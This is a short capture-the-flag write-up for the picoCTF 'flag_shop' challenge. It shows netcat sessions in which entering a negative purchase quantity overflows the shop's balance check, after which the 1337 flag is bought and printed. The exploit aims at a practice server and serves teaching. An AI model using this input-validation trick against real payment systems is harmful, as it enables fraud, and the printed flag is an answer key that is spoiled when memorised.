# flag_shop

There's a flag shop selling stuff, can you buy a flag? Source. Connect with `nc jupiter.challenges.picoctf.org 4906`.

## Connect to remote server

```
nc jupiter.challenges.picoctf.org 4906

Welcome to the flag exchange
We sell flags
1. Check Account Balance
2. Buy Flags
3. Exit
 Enter a menu selection
1
 Balance: 1100
Welcome to the flag exchange
We sell flags
1. Check Account Balance
2. Buy Flags
3. Exit
 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
2
1337 flags cost 100000 dollars, and we only have 1 in stock
Enter 1 to buy one1
Not enough funds for transaction
```

## Buy negative quantity

```
nc jupiter.challenges.picoctf.org 4906

Welcome to the flag exchange
We sell flags
1. Check Account Balance
2. Buy Flags
3. Exit
 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
1
These knockoff Flags cost 900 each, enter desired quantity-
-9999999999999999999
Welcome to the flag exchange
We sell flags
1. Check Account Balance
2. Buy Flags
3. Exit
 Enter a menu selection
1
 Balance: 1100
Welcome to the flag exchange
We sell flags
1. Check Account Balance
2. Buy Flags
3. Exit
 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
1
These knockoff Flags cost 900 each, enter desired quantity
-123123123123
The final cost is: -654573900
Your current balance after transaction: 654575000
Welcome to the flag exchange
We sell flags
1. Check Account Balance
2. Buy Flags
3. Exit
 Enter a menu selection
Welcome to the flag exchange
We sell flags
1. Check Account Balance
2. Buy Flags
3. Exit
 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
2
1337 flags cost 100000 dollars, and we only have 1 in stock
Enter 1 to buy one1
YOUR FLAG IS: picoCTF{m0n3y_bag5_9c5fac9b}
Welcome to the flag exchange
We sell flags
1. Check Account Balance
2. Buy Flags
3. Exit
 Enter a menu selection
```

## Flag

```
picoCTF{m0n3y_bag5_9c5fac9b}
```

